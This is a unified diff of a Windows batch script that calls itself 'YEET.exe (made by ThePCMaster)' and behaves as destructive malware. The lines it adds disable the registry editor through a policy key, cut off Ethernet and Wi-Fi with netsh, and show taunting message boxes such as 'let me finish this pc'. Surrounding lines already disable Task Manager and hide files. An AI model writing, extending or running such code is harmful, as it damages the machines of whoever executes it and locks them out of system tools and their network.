@@ -26,7 +26,7 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MAE+1EbsQ5+n//Na+h2gpGucnfe8=
+::Zh4grVQjdCyDJGyX8VAjFC9cSTShEWqpErAOqNzs4NajrVoTWO0+fJzn45GrFK4W8kCE
 ::YB416Ek+ZW8=
 ::
 ::
@@ -37,9 +37,7 @@ attrib +h yt.vbs
 wscript yt.vbs
 attrib -h yt.vbs
 cd %userprofile%\Desktop
-copy YEET.bat YT.bat
-attrib +h YT.bat
-start YT.bat
+taskkill.exe /f /im YEET.exe
 del %userprofile%\Desktop\YEET.* /f
 echo x=msgbox("because you totally do not now :)",0+0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 attrib +h yt.vbs
@@ -54,7 +52,18 @@ reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Disabl
 attrib +h yt.vbs
 wscript yt.vbs
 attrib -h yt.vbs
-del yt.vbs /f
+echo x=msgbox("you wanna use regedit to unblock task manager? well good luck cuz i disabled the registry editor as well",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+attrib +h yt.vbs
+wscript yt.vbs
+attrib -h yt.vbs
+netsh interface set interface "Ethernet0" admin=disabled
+netsh interface set interface "Wi-Fi" admin=disabled
+netsh interface set interface "Ethernet*" admin=disabled
+echo x=msgbox("adam modemi soktu goturuyor(check ur internet)",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
+attrib +h yt.vbs
+wscript yt.vbs
+attrib -h yt.vbs
 echo x=msgbox("ok enough talk let me finish this pc",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 attrib +h yt.vbs
 wscript yt.vbs
